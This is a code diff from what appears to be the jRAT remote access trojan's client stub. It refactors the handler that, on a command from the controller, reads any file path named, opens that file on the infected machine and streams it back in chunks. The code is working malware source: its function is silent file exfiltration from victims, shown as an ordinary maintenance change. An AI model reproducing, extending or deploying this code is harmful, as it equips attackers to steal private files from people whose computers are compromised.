@@ -16,12 +16,12 @@ import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;
 public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Connection con) throws Exception {
-		final String rawFile = Connection.instance.readLine();
+	public void read(final Connection con) throws Exception {
+		final String rawFile = con.readLine();
 		final File file = new File(rawFile);
 
 		if (file.exists() && file.isFile()) {			
-			Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
+			con.addToSendQueue(new Packet30BeginClientUpload(file));
 
 			TransferData data = new TransferData();
 			data.setLocalFile(file);
@@ -42,17 +42,17 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 								}
 							}
 							
-							if (Thread.interrupted() || !Connection.instance.isConnected()) {
+							if (Thread.interrupted() || !con.isConnected()) {
 								fileInput.close();
 								return;
 							}
 							
 							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(rawFile, chunk, read);
-							Connection.instance.addToSendQueue(packet);
+							con.addToSendQueue(packet);
 						}
 						fileInput.close();
 						
-						Connection.instance.addToSendQueue(new Packet31CompleteClientUpload(rawFile));
+						con.addToSendQueue(new Packet31CompleteClientUpload(rawFile));
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
